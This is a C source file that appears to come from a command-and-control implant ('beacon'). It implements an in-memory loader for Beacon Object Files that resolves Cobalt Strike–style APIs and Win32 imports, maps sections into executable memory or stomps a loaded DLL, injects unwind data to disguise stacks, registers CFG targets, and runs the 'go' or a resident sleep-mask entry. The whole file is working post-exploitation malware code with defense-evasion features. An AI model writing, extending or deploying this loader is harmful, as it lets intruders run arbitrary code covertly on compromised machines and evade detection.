/* beacon/src/Bof/Loader.c  [unity build - includes Api.c + Stomp.c]
 *
 * All three source files (Loader + Api + Stomp) are compiled as ONE translation
 * unit so that NaxBofInitApiTable's reference to BeaconOutput, BeaconDataParse
 * etc. are INTRA-unit.  Cross-unit references on MinGW PE targets produce
 * .refptr.* stubs that live outside .text; since we extract only .text for the
 * shellcode binary those stubs are unavailable at runtime and the addresses come
 * out as the link-time offsets (e.g. 0x43AA) instead of runtime addresses.
 * A single TU forces direct lea rip-relative addressing - no .refptr.* needed. */

#include "Nax.h"
#include "Common.h"
#include "Bof.h"

#define _NAX_BOF_UNITY_BUILD_
#include "Api.c"
#include "Stomp.c"
#undef  _NAX_BOF_UNITY_BUILD_

/* ========= [ helpers ] ========= */

/* Get the symbol's name - handles both short (≤8 bytes embedded) and long (string table). */
static PCHAR SymName( PCOF_SYMBOL sym, PCHAR strtab ) {
    if ( sym->Name.Short == 0 )
        return strtab + sym->Name.Long;
    return sym->cName;
}

static UINT32 NaxHashStrMod( const PCHAR str, UINT32 len ) {
    UINT32 h = 0x811C9DC5u;
    for ( UINT32 i = 0; i < len; i++ ) {
        BYTE c = (BYTE)str[i];
        if ( c >= 'A' && c <= 'Z' ) c += 0x20;
        h ^= c;
        h *= 0x01000193u;
    }
    CHAR dll[] = { '.', 'd', 'l', 'l', '\0' };
    for ( INT i = 0; dll[i]; i++ ) {
        h ^= (BYTE)dll[i];
        h *= 0x01000193u;
    }
    return h;
}

/* ========= [ Beacon API table ] ========= */

#define _API(i, h, fn) do { tbl[(i)].Hash = (h); tbl[(i)].Proc = (PVOID)(fn); } while(0)

static VOID NaxBofInitApiTable( NAX_BOF_API* tbl, PNAX_INSTANCE Nax ) {
    _API(  0, H_BOF_BEACONDATAPARSE,      BeaconDataParse      );
    _API(  1, H_BOF_BEACONDATAINT,        BeaconDataInt        );
    _API(  2, H_BOF_BEACONDATASHORT,      BeaconDataShort      );
    _API(  3, H_BOF_BEACONDATALENGTH,     BeaconDataLength     );
    _API(  4, H_BOF_BEACONDATAEXTRACT,    BeaconDataExtract    );
    _API(  5, H_BOF_BEACONOUTPUT,         BeaconOutput         );
    _API(  6, H_BOF_BEACONPRINTF,         BeaconPrintf         );
    _API(  7, H_BOF_BEACONISADMIN,        BeaconIsAdmin        );
    _API(  8, H_BOF_BEACONFORMATALLOC,    BeaconFormatAlloc    );
    _API(  9, H_BOF_BEACONFORMATRESET,    BeaconFormatReset    );
    _API( 10, H_BOF_BEACONFORMATFREE,     BeaconFormatFree     );
    _API( 11, H_BOF_BEACONFORMATAPPEND,   BeaconFormatAppend   );
    _API( 12, H_BOF_BEACONFORMATPRINTF,   BeaconFormatPrintf   );
    _API( 13, H_BOF_BEACONFORMATTOSTRING, BeaconFormatToString );
    _API( 14, H_BOF_BEACONFORMATINT,      BeaconFormatInt      );
    _API( 15, H_BOF_BEACONDATAPTR,        BeaconDataPtr        );
    _API( 16, H_BOF_BEACONUSETOKEN,       BeaconUseToken       );
    _API( 17, H_BOF_BEACONREVERTTOKEN,    BeaconRevertToken    );
    _API( 18, H_BOF_BEACONGETSPAWNTO,     BeaconGetSpawnTo     );
    _API( 19, H_BOF_BEACONINFORMATION,    BeaconInformation    );
    _API( 20, H_BOF_TOWIDECHAR,           toWideChar           );
    _API( 21, H_BOF_AXADDSCREENSHOT,      AxAddScreenshot      );
    _API( 22, H_BOF_AXDOWNLOADMEMORY,     AxDownloadMemory     );
    /* Win32 proxy functions - bare LoadLibraryA/GetProcAddress/etc. from <windows.h>
     * generate __imp_LoadLibraryA COFF symbols with no MODULE$ prefix. */
    _API( 23, H_BOF_LOADLIBRARYA,         Nax->Kernel32.LoadLibraryA     );
    _API( 24, H_BOF_GETPROCADDRESS,       Nax->Kernel32.GetProcAddress   );
    _API( 25, H_BOF_GETMODULEHANDLEA,     Nax->Kernel32.GetModuleHandleA );
    _API( 26, H_BOF_FREELIBRARY,          Nax->Kernel32.FreeLibrary      );
    _API( 27, H_BOF_BEACONWAKEUP,          BeaconWakeup          );
    _API( 28, H_BOF_BEACONGETSTOPJOBEVENT,  BeaconGetStopJobEvent );
    _API( 29, H_BOF_BEACONADDVALUE,        BeaconAddValue        );
    _API( 30, H_BOF_BEACONGETVALUE,        BeaconGetValue        );
    _API( 31, H_BOF_BEACONREMOVEVALUE,     BeaconRemoveValue     );
    /* heap isolation: BOF intAlloc/intFree use private heap, not process heap */
    _API( 32, H_BOF_GETPROCESSHEAP,        BofGetProcessHeap     );
}
#undef _API

/* ========= [ external symbol resolution ] ========= */

static PVOID NaxBofResolveExternal( PNAX_INSTANCE Nax, PCHAR sym_name,
                                    NAX_BOF_API* bofApiTable ) {
    /* ---- Beacon API lookup (no '$' separator) ---- */
    UINT32 sym_hash = NaxHashStr( sym_name );
    for ( INT i = 0; i < NAX_BOF_API_COUNT; i++ ) {
        if ( bofApiTable[i].Hash == sym_hash ) {
            NaxDbg( Nax, "[bof] sym '%s' -> BeaconAPI[%d] %p", sym_name, i, bofApiTable[i].Proc );
            return bofApiTable[i].Proc;
        }
    }

    /* ---- Win32 API: MODULE$FUNCTION ---- */
    UINT32 mod_len = 0;
    while ( sym_name[ mod_len ] && sym_name[ mod_len ] != '$' ) mod_len++;
    if ( sym_name[ mod_len ] != '$' ) {
        PVOID proc = Nax->Kernel32.GetProcAddress( Nax->Kernel32.Handle, sym_name );
        NaxDbg( Nax, "[bof] sym '%s' -> bare k32 fallback %p", sym_name, proc );
        return proc;
    }

    PCHAR  func_name = sym_name + mod_len + 1;
    UINT32 mod_hash  = NaxHashStrMod( sym_name, mod_len );

    PVOID hMod = NaxGetModule( mod_hash );
    if ( !hMod ) {
        CHAR mod_buf[64];
        UINT32 i;
        for ( i = 0; i < mod_len && i < 59; i++ ) {
            CHAR c = sym_name[i];
            if ( c >= 'A' && c <= 'Z' ) c += 0x20;
            mod_buf[i] = c;
        }
        mod_buf[i++] = '.'; mod_buf[i++] = 'd';
        mod_buf[i++] = 'l'; mod_buf[i++] = 'l';
        mod_buf[i]   = '\0';
        NaxDbg( Nax, "[bof] sym '%s' -> LoadLibraryA('%s')", sym_name, mod_buf );
        hMod = Nax->Kernel32.LoadLibraryA( mod_buf );
    }
    if ( !hMod ) {
        NaxDbg( Nax, "[bof] sym '%s' -> module NOT FOUND", sym_name );
        return NULL;
    }

    PVOID proc = Nax->Kernel32.GetProcAddress( hMod, func_name );
    NaxDbg( Nax, "[bof] sym '%s' -> %p (mod=%p)", sym_name, proc, hMod );
    return proc;
}

/* ========= [ section allocation ] ========= */

#define BOF_ALLOC_FLAGS (MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN)

static INT NaxBofAllocSections( PNAX_INSTANCE Nax, PBYTE bof,
                                 PCOF_HEADER hdr, PCOF_SECTION sections,
                                 PVOID* mapSections, PVOID* mf_out,
                                 BOOL* stomped ) {
    NaxDbg( Nax, "[bof] alloc: NtAllocVMem=%p", Nax->Ntdll.NtAllocateVirtualMemory );

    if ( NaxBofStompAlloc( Nax, bof, hdr, sections, mapSections, mf_out ) ) {
        *stomped = TRUE;
        NaxDbg( Nax, "[bof] stomp mapFunctions=%p", *mf_out );
        return NAX_OK;
    }
    *stomped = FALSE;

    for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
        PCOF_SECTION s = sections + i;

        UINT32 raw_size  = s->SizeOfRawData;
        UINT32 virt_size = s->VirtualSize;
        UINT32 need      = ( virt_size > raw_size ) ? virt_size : raw_size;

        if ( need == 0 ) {
            mapSections[i] = NULL;
            NaxDbg( Nax, "[bof] sec[%d] '%.8s' skip (raw=%u virt=%u)",
                    (INT)i, s->Name, raw_size, virt_size );
            continue;
        }

        PVOID  base  = NULL;
        SIZE_T alloc = (SIZE_T)need + 16;
        NTSTATUS st  = Nax->Ntdll.NtAllocateVirtualMemory( NtCurrentProcess(), &base, 0, &alloc, BOF_ALLOC_FLAGS, PAGE_EXECUTE_READWRITE );

        NaxDbg( Nax, "[bof] sec[%d] '%.8s' alloc raw=%u virt=%u -> %p (st=0x%x)",
                (INT)i, s->Name, raw_size, virt_size, base, (UINT32)st );

        if ( !NT_SUCCESS( st ) ) {
            for ( UINT16 j = 0; j < i; j++ ) {
                if ( mapSections[j] ) {
                    SIZE_T sz = 0; PVOID b = mapSections[j];
                    Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &b, &sz, MEM_RELEASE );
                    mapSections[j] = NULL;
                }
            }
            return NAX_ERR_FAIL;
        }

        mapSections[i] = base;
        if ( s->PointerToRawData && raw_size )
            MmCopy( base, bof + s->PointerToRawData, raw_size );
    }

    PVOID  mf  = NULL;
    SIZE_T mfs = 4096;
    Nax->Ntdll.NtAllocateVirtualMemory( NtCurrentProcess(), &mf, 0, &mfs, BOF_ALLOC_FLAGS, PAGE_EXECUTE_READWRITE );
    if ( mf ) MmZero( mf, mfs );
    *mf_out = mf;
    NaxDbg( Nax, "[bof] mapFunctions=%p (dist from .text: 0x%llx)",
            mf, mf ? (unsigned long long)((ULONG_PTR)mf - (ULONG_PTR)mapSections[0]) : 0 );
    return NAX_OK;
}

/* ========= [ cleanup ] ========= */

static VOID NaxBofCleanupSections( PNAX_INSTANCE Nax, PVOID* mapSections,
                                   UINT16 numSections, BOOL stomped ) {
    if ( stomped ) {
        NaxBofStompFree( Nax, mapSections, numSections );
        return;
    }
    for ( UINT16 i = 0; i < numSections && i < BOF_MAX_SECTIONS; i++ ) {
        if ( mapSections[i] ) {
            PVOID  base = mapSections[i];
            SIZE_T sz   = 0;
            Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &base, &sz, MEM_RELEASE );
            mapSections[i] = NULL;
        }
    }
}

/* ========= [ relocation processing ] ========= */
static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
                                     PCOF_HEADER hdr, PCOF_SECTION sections,
                                     PCOF_SYMBOL symtab, PCHAR strtab,
                                     PVOID* mapSections,
                                     NAX_BOF_API* bofApiTable,
                                     PUINT64 mapFunctions, UINT32* mf_idx,
                                     ULONG_PTR image_base ) {
    for ( UINT16 si = 0; si < hdr->NumberOfSections && si < BOF_MAX_SECTIONS; si++ ) {
        PCOF_SECTION s = sections + si;
        if ( !s->NumberOfRelocations || !s->PointerToRelocations ) continue;
        if ( !mapSections[si] ) continue;

        NaxDbg( Nax, "[bof] reloc sec[%d] '%.8s' %u relocs", (INT)si, s->Name, (UINT32)s->NumberOfRelocations );

        PCOF_RELOCATION relocs = (PCOF_RELOCATION)( bof + s->PointerToRelocations );

        for ( UINT16 ri = 0; ri < s->NumberOfRelocations; ri++ ) {
            PCOF_RELOCATION r    = relocs + ri;
            PCOF_SYMBOL     sym  = symtab + r->SymbolTableIndex;
            PBYTE           loc  = (PBYTE)mapSections[si] + r->VirtualAddress;

            PVOID sym_addr = NULL;

            if ( sym->SectionNumber > 0 ) {
                INT secIdx = sym->SectionNumber - 1;
                if ( secIdx >= BOF_MAX_SECTIONS || !mapSections[secIdx] ) continue;
                sym_addr = (PVOID)( (ULONG_PTR)mapSections[secIdx] + sym->Value );
            } else {
                PCHAR name = SymName( sym, strtab );

                if ( name[0] == '_' && name[1] == '_' &&
                     name[2] == 'i' && name[3] == 'm' &&
                     name[4] == 'p' && name[5] == '_' )
                    name += 6;

                sym_addr = NaxBofResolveExternal( Nax, name, bofApiTable );
                if ( !sym_addr ) {
                    UINT32 nlen = NaxStrLen( name );
                    NaxDbg( Nax, "[bof] UNRESOLVED symbol: '%s'", name );
                    BeaconOutput( CALLBACK_ERROR, name, (INT)nlen );
                    return NAX_ERR_FAIL;
                }
            }

            switch ( r->Type ) {
#if defined(__x86_64__) || defined(_WIN64)
            case IMAGE_REL_AMD64_ADDR64:
                *((UINT64*)loc) += (UINT64)(ULONG_PTR)sym_addr;
                break;
            case IMAGE_REL_AMD64_ADDR32NB: {
                INT32 cur;
                MmCopy( &cur, loc, 4 );
                cur += (INT32)( (ULONG_PTR)sym_addr - image_base );
                MmCopy( loc, &cur, 4 );
                break;
            }
            case IMAGE_REL_AMD64_REL32:
            case IMAGE_REL_AMD64_REL32_1:
            case IMAGE_REL_AMD64_REL32_2:
            case IMAGE_REL_AMD64_REL32_3:
            case IMAGE_REL_AMD64_REL32_4:
            case IMAGE_REL_AMD64_REL32_5: {
                UINT32 delta  = r->Type - IMAGE_REL_AMD64_REL32;
                INT32  addend = 0;
                MmCopy( &addend, loc, 4 );

                PVOID target;

                if ( sym->SectionNumber > 0 || !mapFunctions ) {
                    target = sym_addr;
                } else {
                    if ( *mf_idx < 512 ) {
                        mapFunctions[ *mf_idx ] = (UINT64)(ULONG_PTR)sym_addr;
                        target = (PVOID)( mapFunctions + *mf_idx );
                        (*mf_idx)++;
                    } else {
                        target = sym_addr;
                    }
                }

                *((UINT32*)loc) = (UINT32)( addend + (ULONG_PTR)target
                                            - (ULONG_PTR)( loc + 4 + delta ) );
                break;
            }
#else
            case IMAGE_REL_I386_DIR32:
                *((UINT32*)loc) += (UINT32)(ULONG_PTR)sym_addr;
                break;
            case IMAGE_REL_I386_REL32:
                *((UINT32*)loc) += (UINT32)( (ULONG_PTR)sym_addr - (ULONG_PTR)( loc + 4 ) );
                break;
#endif
            default:
                NaxDbg( Nax, "[bof] unknown reloc type 0x%x in sec[%d]", (UINT32)r->Type, (INT)si );
                break;
            }
        }
    }
    return NAX_OK;
}

/* ========= [ entry point search ] ========= */

static PVOID NaxBofFindEntry( PNAX_INSTANCE Nax, PCOF_HEADER hdr, PCOF_SYMBOL symtab,
                              PCHAR strtab, PVOID* mapSections ) {
    for ( UINT32 i = 0; i < hdr->NumberOfSymbols; i++ ) {
        PCOF_SYMBOL sym = symtab + i;
        if ( sym->SectionNumber <= 0 ) {
            i += sym->NumberOfAuxSymbols;
            continue;
        }
        PCHAR name = SymName( sym, strtab );

        BOOL match = ( name[0] == 'g' && name[1] == 'o' && name[2] == '\0' );
#if !defined(__x86_64__) && !defined(_WIN64)
        if ( !match )
            match = ( name[0] == '_' && name[1] == 'g' && name[2] == 'o' && name[3] == '\0' );
#endif
        if ( match ) {
            INT secIdx = sym->SectionNumber - 1;
            if ( secIdx < BOF_MAX_SECTIONS && mapSections[secIdx] ) {
                PVOID entry = (PVOID)( (ULONG_PTR)mapSections[secIdx] + sym->Value );
                NaxDbg( Nax, "[bof] entry 'go' found: sec[%d]+0x%x = %p", secIdx, (UINT32)sym->Value, entry );
                return entry;
            }
        }
        i += sym->NumberOfAuxSymbols;
    }
    NaxDbg( Nax, "[bof] entry 'go' NOT FOUND in %u symbols", (UINT32)hdr->NumberOfSymbols );
    return NULL;
}

/* ========= [ public entry point ] ========= */

FUNC INT NaxBofExecute( PNAX_INSTANCE Nax,
                        PBYTE bof, UINT32 bof_size,
                        PBYTE user_args, UINT32 user_args_size ) {
    if ( bof_size < sizeof( COF_HEADER ) ) return NAX_ERR_WIRE;

    PCOF_HEADER  hdr      = (PCOF_HEADER)bof;
    PCOF_SECTION sections = (PCOF_SECTION)( bof + sizeof( COF_HEADER ) );
    PCOF_SYMBOL  symtab   = (PCOF_SYMBOL)( bof + hdr->PointerToSymbolTable );
    PCHAR        strtab   = (PCHAR)( symtab + hdr->NumberOfSymbols );

    NaxDbg( Nax, "[bof] execute: %u bytes machine=0x%04x sections=%u symbols=%u",
            bof_size, (UINT32)hdr->Machine, (UINT32)hdr->NumberOfSections, (UINT32)hdr->NumberOfSymbols );

    if ( hdr->Machine != COF_MACHINE_AMD64 ) {
        NaxDbg( Nax, "[bof] wrong machine type 0x%04x (expected 0x8664)", (UINT32)hdr->Machine );
        return NAX_ERR_INVAL;
    }

    NAX_BOF_API bofApiTable[ NAX_BOF_API_COUNT ];
    NaxBofInitApiTable( bofApiTable, Nax );

    PVOID mapSections[ BOF_MAX_SECTIONS ];
    MmZero( mapSections, sizeof( mapSections ) );

    PVOID  mf_base = NULL;
    UINT32 mf_idx  = 0;
    BOOL   stomped = FALSE;

    /* ---- 1. allocate sections + mapFunctions (all via AllocSections) ---- */
    NaxDbg( Nax, "[bof] step 1: alloc sections" );
    if ( NaxBofAllocSections( Nax, bof, hdr, sections, mapSections, &mf_base, &stomped ) != NAX_OK ) {
        NaxDbg( Nax, "[bof] alloc FAILED" );
        BeaconOutput( CALLBACK_ERROR, "alloc", 5 );
        return NAX_ERR_FAIL;
    }
    NaxDbg( Nax, "[bof] step 1: alloc OK (stomped=%d)", (INT)stomped );

    ULONG_PTR image_base = (ULONG_PTR)~0ULL;
    for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
        if ( mapSections[i] && (ULONG_PTR)mapSections[i] < image_base )
            image_base = (ULONG_PTR)mapSections[i];
    }
    if ( mf_base && (ULONG_PTR)mf_base < image_base )
        image_base = (ULONG_PTR)mf_base;
    NaxDbg( Nax, "[bof] image_base=%p (.text offset from base=0x%llx)",
            (PVOID)image_base, (unsigned long long)( (ULONG_PTR)mapSections[0] - image_base ) );

    /* ---- 2. process relocations ---- */
    NaxDbg( Nax, "[bof] step 2: process relocations" );
    if ( NaxBofProcessRelocations( Nax, bof, hdr, sections,
                                   symtab, strtab, mapSections, bofApiTable,
                                   (PUINT64)mf_base, &mf_idx, image_base ) != NAX_OK ) {
        NaxDbg( Nax, "[bof] reloc FAILED" );
        NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
        if ( mf_base ) { SIZE_T z=0; PVOID b=mf_base; Nax->Ntdll.NtFreeVirtualMemory(NtCurrentProcess(),&b,&z,MEM_RELEASE); }
        return NAX_ERR_FAIL;
    }
    NaxDbg( Nax, "[bof] reloc OK (mapFunctions used=%u slots)", mf_idx );

    /* ---- 3. register BOF .pdata for clean stack unwinding (stomp) ---- */
    PRUNTIME_FUNCTION pdataTable = NULL;
    DWORD pdataCount = 0;
    BOOL  pdataInDll = FALSE;
    if ( stomped ) {
        for ( UINT16 pi = 0; pi < hdr->NumberOfSections && pi < BOF_MAX_SECTIONS; pi++ ) {
            PCOF_SECTION ps = sections + pi;
            if ( ps->Name[0] == '.' && ps->Name[1] == 'p' && ps->Name[2] == 'd' &&
                 ps->Name[3] == 'a' && ps->Name[4] == 't' && ps->Name[5] == 'a' &&
                 mapSections[pi] && ps->SizeOfRawData >= 12 ) {
                pdataTable = (PRUNTIME_FUNCTION)mapSections[pi];
                pdataCount = ps->SizeOfRawData / sizeof( RUNTIME_FUNCTION );

                PVOID xdataBase = NULL;
                ULONG xdataSize = 0;
                ULONG_PTR firstUnwindVA = image_base + pdataTable[0].UnwindData;
                for ( UINT16 xi = 0; xi < hdr->NumberOfSections && xi < BOF_MAX_SECTIONS; xi++ ) {
                    if ( !mapSections[xi] ) continue;
                    UINT32 secSz = sections[xi].SizeOfRawData;
                    if ( secSz == 0 ) secSz = sections[xi].VirtualSize;
                    if ( firstUnwindVA >= (ULONG_PTR)mapSections[xi] &&
                         firstUnwindVA <  (ULONG_PTR)mapSections[xi] + secSz ) {
                        xdataBase = mapSections[xi];
                        xdataSize = secSz;
                        break;
                    }
                }

                pdataInDll = NaxBofStompPdata( Nax, pdataTable, pdataCount, image_base,
                                                xdataBase, xdataSize );
                if ( !pdataInDll )
                    Nax->Ntdll.RtlAddFunctionTable( pdataTable, pdataCount, (DWORD64)image_base );
                NaxDbg( Nax, "[bof] .pdata %s: %u entries base=%p xdata=%p(%u)",
                        pdataInDll ? "injected into DLL" : "registered dynamic",
                        pdataCount, (PVOID)image_base, xdataBase, xdataSize );
                break;
            }
        }
    }

    /* ---- 3b. set final memory protections ---- */
    if ( stomped ) {
        NaxBofStompProtect( Nax, mapSections, hdr->NumberOfSections, sections );
        NaxDbg( Nax, "[bof] step 3b: stomp protections OK (.text=RX, rest=RW)" );
    } else {
        NaxDbg( Nax, "[bof] step 3b: set PAGE_EXECUTE_READWRITE on all sections" );
        for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
            if ( !mapSections[i] ) continue;
            PVOID    base = mapSections[i];
            SIZE_T   sz   = (SIZE_T)( sections[i].SizeOfRawData + 16 );
            ULONG    old  = 0;
            NTSTATUS st   = Nax->Ntdll.NtProtectVirtualMemory( NtCurrentProcess(), &base, &sz, PAGE_EXECUTE_READWRITE, &old );
            NaxDbg( Nax, "[bof] sec[%d] '%.8s' RWX st=0x%x", (INT)i, sections[i].Name, (UINT32)st );
        }
        NaxDbg( Nax, "[bof] step 3b: protections OK" );
    }

    /* ---- 4. find entry point ---- */
    NaxDbg( Nax, "[bof] step 4: find 'go'" );
    PVOID entry = NaxBofFindEntry( Nax, hdr, symtab, strtab, mapSections );
    if ( !entry ) {
        NaxDbg( Nax, "[bof] entry FAILED" );
        if ( pdataTable && !pdataInDll ) Nax->Ntdll.RtlDeleteFunctionTable( pdataTable );
        NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
        if ( mf_base ) { SIZE_T _z=0; PVOID _b=mf_base; Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &_b, &_z, MEM_RELEASE ); }
        BeaconOutput( CALLBACK_ERROR, "go", 2 );
        return NAX_ERR_FAIL;
    }
    NaxDbg( Nax, "[bof] entry OK: %p", entry );

    NAX_JOB* curJob = NaxFindCurrentJob( Nax );
    NAX_BOF_CTX* stompCtx = curJob ? &curJob->BofCtx : &Nax->BofCtx;
    stompCtx->Stomped   = stomped ? 0x01 : 0x00;
    stompCtx->StompSlot = stomped ? ( curJob ? curJob->StompSlotIdx : 0xFF ) : 0x00;

    /* ---- 5. execute BOF ---- */
    if ( stomped && Nax->CfgEnabled ) {
        BOF_STOMP_SLOT* cfgSlot = NULL;
        if ( Nax->BofStompPool.SmStompReq )
            cfgSlot = &Nax->BofStompPool.SmSlot;
        else if ( curJob == NULL )
            cfgSlot = &Nax->BofStompPool.SyncSlot;
        else if ( curJob->StompSlotIdx < Nax->BofStompPool.AsyncCount )
            cfgSlot = &Nax->BofStompPool.AsyncSlots[ curJob->StompSlotIdx ];
        if ( cfgSlot )
            NaxCfgAddTarget( Nax, cfgSlot->DllBase, entry );
    }

    NaxDbg( Nax, "[bof] calling go(%p, %u)", user_args, user_args_size );
    void ( *go )( char*, unsigned long ) = (void(*)( char*, unsigned long ))entry;
    go( (char*)user_args, (unsigned long)user_args_size );
    NaxDbg( Nax, "[bof] go returned, output=%u bytes", Nax->BofCtx.Len );

    if ( pdataTable && !pdataInDll ) Nax->Ntdll.RtlDeleteFunctionTable( pdataTable );

    /* ---- 6. cleanup ---- */
    NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
    if ( mf_base ) {
        SIZE_T _z = 0; PVOID _b = mf_base;
        Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &_b, &_z, MEM_RELEASE );
    }
    NaxDbg( Nax, "[bof] done" );
    return NAX_OK;
}

/* ========= [ resident BOF: load + keep alive ] ========= */

/* Find a named symbol (e.g. "sleep_mask") instead of hardcoded "go". */
static PVOID NaxBofFindSymbol( PNAX_INSTANCE Nax, PCOF_HEADER hdr, PCOF_SYMBOL symtab,
                               PCHAR strtab, PVOID* mapSections, PCHAR target ) {
    UINT32 tlen = NaxStrLen( target );
    for ( UINT32 i = 0; i < hdr->NumberOfSymbols; i++ ) {
        PCOF_SYMBOL sym = symtab + i;
        if ( sym->SectionNumber <= 0 ) {
            i += sym->NumberOfAuxSymbols;
            continue;
        }
        PCHAR name = SymName( sym, strtab );
        BOOL match = TRUE;
        for ( UINT32 k = 0; k <= tlen; k++ ) {
            if ( name[k] != target[k] ) { match = FALSE; break; }
        }
        if ( match ) {
            INT secIdx = sym->SectionNumber - 1;
            if ( secIdx < BOF_MAX_SECTIONS && mapSections[secIdx] ) {
                PVOID entry = (PVOID)( (ULONG_PTR)mapSections[secIdx] + sym->Value );
                NaxDbg( Nax, "[bof] symbol '%s' found: sec[%d]+0x%x = %p", target, secIdx, (UINT32)sym->Value, entry );
                return entry;
            }
        }
        i += sym->NumberOfAuxSymbols;
    }
    NaxDbg( Nax, "[bof] symbol '%s' NOT FOUND", target );
    return NULL;
}

FUNC PVOID NaxBofLoadResident( PNAX_INSTANCE Nax,
                               PBYTE bof, UINT32 bof_size,
                               PCHAR sym_name ) {
    if ( bof_size < sizeof( COF_HEADER ) ) return NULL;

    NaxBofFreeResident( Nax );

    PCOF_HEADER  hdr      = (PCOF_HEADER)bof;
    PCOF_SECTION sections = (PCOF_SECTION)( bof + sizeof( COF_HEADER ) );
    PCOF_SYMBOL  symtab   = (PCOF_SYMBOL)( bof + hdr->PointerToSymbolTable );
    PCHAR        strtab   = (PCHAR)( symtab + hdr->NumberOfSymbols );

    NaxDbg( Nax, "[bof-resident] load: %u bytes sections=%u symbols=%u",
            bof_size, (UINT32)hdr->NumberOfSections, (UINT32)hdr->NumberOfSymbols );

    if ( hdr->Machine != COF_MACHINE_AMD64 ) return NULL;

    NAX_BOF_API bofApiTable[ NAX_BOF_API_COUNT ];
    NaxBofInitApiTable( bofApiTable, Nax );

    PVOID mapSections[ BOF_MAX_SECTIONS ];
    MmZero( mapSections, sizeof( mapSections ) );

    PVOID  mf_base = NULL;
    UINT32 mf_idx  = 0;
    BOOL   stomped = FALSE;

    Nax->BofStompPool.SmStompReq = TRUE;

    if ( NaxBofAllocSections( Nax, bof, hdr, sections, mapSections, &mf_base, &stomped ) != NAX_OK ) {
        NaxDbg( Nax, "[bof-resident] alloc FAILED" );
        Nax->BofStompPool.SmStompReq = FALSE;
        return NULL;
    }

    ULONG_PTR image_base = (ULONG_PTR)~0ULL;
    for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
        if ( mapSections[i] && (ULONG_PTR)mapSections[i] < image_base )
            image_base = (ULONG_PTR)mapSections[i];
    }
    if ( mf_base && (ULONG_PTR)mf_base < image_base )
        image_base = (ULONG_PTR)mf_base;

    if ( NaxBofProcessRelocations( Nax, bof, hdr, sections,
                                   symtab, strtab, mapSections, bofApiTable,
                                   (PUINT64)mf_base, &mf_idx, image_base ) != NAX_OK ) {
        NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
        if ( mf_base ) { SIZE_T z=0; PVOID b=mf_base; Nax->Ntdll.NtFreeVirtualMemory(NtCurrentProcess(),&b,&z,MEM_RELEASE); }
        Nax->BofStompPool.SmStompReq = FALSE;
        return NULL;
    }

    PRUNTIME_FUNCTION pdataTable = NULL;
    DWORD pdataCount = 0;
    BOOL  pdataInDll = FALSE;
    if ( stomped ) {
        for ( UINT16 pi = 0; pi < hdr->NumberOfSections && pi < BOF_MAX_SECTIONS; pi++ ) {
            PCOF_SECTION ps = sections + pi;
            if ( ps->Name[0] == '.' && ps->Name[1] == 'p' && ps->Name[2] == 'd' &&
                 ps->Name[3] == 'a' && ps->Name[4] == 't' && ps->Name[5] == 'a' &&
                 mapSections[pi] && ps->SizeOfRawData >= 12 ) {
                pdataTable = (PRUNTIME_FUNCTION)mapSections[pi];
                pdataCount = ps->SizeOfRawData / sizeof( RUNTIME_FUNCTION );
                PVOID xdataBase = NULL;
                ULONG xdataSize = 0;
                ULONG_PTR firstUnwindVA = image_base + pdataTable[0].UnwindData;
                for ( UINT16 xi = 0; xi < hdr->NumberOfSections && xi < BOF_MAX_SECTIONS; xi++ ) {
                    if ( !mapSections[xi] ) continue;
                    UINT32 secSz = sections[xi].SizeOfRawData;
                    if ( secSz == 0 ) secSz = sections[xi].VirtualSize;
                    if ( firstUnwindVA >= (ULONG_PTR)mapSections[xi] &&
                         firstUnwindVA <  (ULONG_PTR)mapSections[xi] + secSz ) {
                        xdataBase = mapSections[xi];
                        xdataSize = secSz;
                        break;
                    }
                }
                pdataInDll = NaxBofStompPdata( Nax, pdataTable, pdataCount, image_base,
                                                xdataBase, xdataSize );
                if ( !pdataInDll )
                    Nax->Ntdll.RtlAddFunctionTable( pdataTable, pdataCount, (DWORD64)image_base );
                break;
            }
        }
    }

    if ( stomped ) {
        NaxBofStompProtect( Nax, mapSections, hdr->NumberOfSections, sections );
    } else {
        for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
            if ( !mapSections[i] ) continue;
            PVOID    base = mapSections[i];
            SIZE_T   sz   = (SIZE_T)( sections[i].SizeOfRawData + 16 );
            ULONG    old  = 0;
            Nax->Ntdll.NtProtectVirtualMemory( NtCurrentProcess(), &base, &sz,
                                                PAGE_EXECUTE_READWRITE, &old );
        }
    }

    PVOID entry = NaxBofFindSymbol( Nax, hdr, symtab, strtab, mapSections, sym_name );
    if ( !entry ) {
        if ( pdataTable && !pdataInDll ) Nax->Ntdll.RtlDeleteFunctionTable( pdataTable );
        NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
        if ( mf_base ) { SIZE_T z=0; PVOID b=mf_base; Nax->Ntdll.NtFreeVirtualMemory(NtCurrentProcess(),&b,&z,MEM_RELEASE); }
        Nax->BofStompPool.SmStompReq = FALSE;
        return NULL;
    }

    Nax->BofStompPool.SmStompReq = FALSE;

    for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ )
        Nax->ResidentSections[i] = mapSections[i];
    Nax->ResidentNumSections = hdr->NumberOfSections;
    Nax->ResidentMapFunc     = mf_base;
    Nax->ResidentStomped     = stomped;
    Nax->ResidentPdata       = pdataTable;
    Nax->ResidentPdataCount  = pdataCount;
    Nax->ResidentPdataInDll  = pdataInDll;

    NaxDbg( Nax, "[bof-resident] loaded '%s' at %p (stomped=%d sm_slot=%d)",
            sym_name, entry, (INT)stomped, (INT)(stomped && Nax->BofStompPool.SmSlot.InUse) );
    return entry;
}

